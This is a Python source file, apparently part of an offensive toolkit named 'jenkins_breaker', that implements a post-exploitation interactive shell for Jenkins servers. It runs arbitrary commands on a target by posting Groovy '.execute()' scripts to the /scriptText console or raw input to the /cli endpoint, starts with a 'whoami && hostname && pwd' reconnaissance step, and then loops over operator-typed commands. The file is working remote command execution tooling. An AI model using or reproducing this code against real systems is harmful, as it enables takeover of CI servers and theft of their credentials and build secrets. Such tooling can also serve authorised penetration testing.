"""
Interactive shell module for post-exploitation.
"""

import queue

from rich.console import Console

from jenkins_breaker.core.session import JenkinsSession
from jenkins_breaker.post.base import PostModule, PostResult

console = Console()


class InteractiveShell:
    """
    Interactive shell session handler.

    Provides an interactive prompt for executing commands through
    various methods (Groovy script console, CLI, etc.)
    """

    def __init__(self, session: JenkinsSession, method: str = "script_console"):
        self.session = session
        self.method = method
        self.running = False
        self.output_queue: queue.Queue = queue.Queue()

    def execute_command(self, command: str) -> str:
        """
        Execute a command on the target.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        if self.method == "script_console":
            return self._execute_via_script_console(command)
        elif self.method == "cli":
            return self._execute_via_cli(command)
        else:
            return "Error: Unknown execution method"

    def _execute_via_script_console(self, command: str) -> str:
        """
        Execute command via Groovy script console.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        groovy_script = f"""
def proc = "{command}".execute()
proc.waitFor()
def output = proc.text
return output
"""

        try:
            response = self.session.post(
                "/scriptText",
                data={"script": groovy_script}
            )

            if response.status_code == 200:
                return response.text
            else:
                return f"Error: HTTP {response.status_code}"

        except Exception as e:
            return f"Error: {str(e)}"

    def _execute_via_cli(self, command: str) -> str:
        """
        Execute command via Jenkins CLI.

        Args:
            command: Command to execute

        Returns:
            Command output
        """
        try:
            response = self.session.post(
                "/cli",
                data=command.encode()
            )

            return response.text

        except Exception as e:
            return f"Error: {str(e)}"

    def start_interactive(self):
        """Start an interactive shell session."""
        console.print("\n[green]Interactive shell started[/green]")
        console.print(f"[cyan]Method: {self.method}[/cyan]")
        console.print("[yellow]Type commands and press Enter[/yellow]")
        console.print("[yellow]Type 'exit' or 'quit' to close shell[/yellow]")
        console.print("[yellow]Type 'help' for available commands[/yellow]\n")

        self.running = True

        command = "whoami && hostname && pwd"
        console.print(f"[dim]$ {command}[/dim]")
        output = self.execute_command(command)
        console.print(output)

        try:
            while self.running:
                try:
                    command = input("$ ").strip()

                    if not command:
                        continue

                    if command.lower() in ['exit', 'quit']:
                        break

                    if command.lower() == 'help':
                        self._print_help()
                        continue

                    output = self.execute_command(command)
                    console.print(output)

                except (KeyboardInterrupt, EOFError):
                    console.print("\n[yellow]Use 'exit' to quit[/yellow]")
                    continue

        finally:
            self.running = False
            console.print("\n[cyan]Shell session closed[/cyan]")

    def _print_help(self):
        """Print help information."""
        console.print("\n[cyan]Interactive Shell Help[/cyan]")
        console.print("  exit, quit  - Close shell session")
        console.print("  help        - Show this help")
        console.print("  cd <dir>    - Change directory")
        console.print("  pwd         - Print working directory")
        console.print("  ls          - List directory contents")
        console.print("  cat <file>  - Display file contents")
        console.print("  Any command - Execute on target\n")

    def stop(self):
        """Stop the interactive shell."""
        self.running = False


class ShellModule(PostModule):
    """Post-exploitation module for interactive shell."""

    MODULE_NAME = "interactive_shell"
    MODULE_DESCRIPTION = "Interactive shell session"

    def run(self, session: JenkinsSession, **kwargs) -> PostResult:
        """
        Start an interactive shell session.

        Args:
            session: Active Jenkins session
            **kwargs: method (script_console, cli)

        Returns:
            PostResult: Result of shell execution
        """
        method = kwargs.get('method', 'script_console')

        try:
            shell = InteractiveShell(session, method)
            shell.start_interactive()

            return PostResult(
                module=self.MODULE_NAME,
                status="success",
                details=f"Interactive shell session completed via {method}",
                data={"method": method}
            )

        except Exception as e:
            return PostResult(
                module=self.MODULE_NAME,
                status="error",
                details="Shell session encountered an error",
                error=str(e)
            )


def spawn_shell(session: JenkinsSession, method: str = "script_console") -> InteractiveShell:
    """
    Convenience function to spawn an interactive shell.

    Args:
        session: Active Jenkins session
        method: Execution method

    Returns:
        InteractiveShell instance
    """
    shell = InteractiveShell(session, method)
    shell.start_interactive()
    return shell
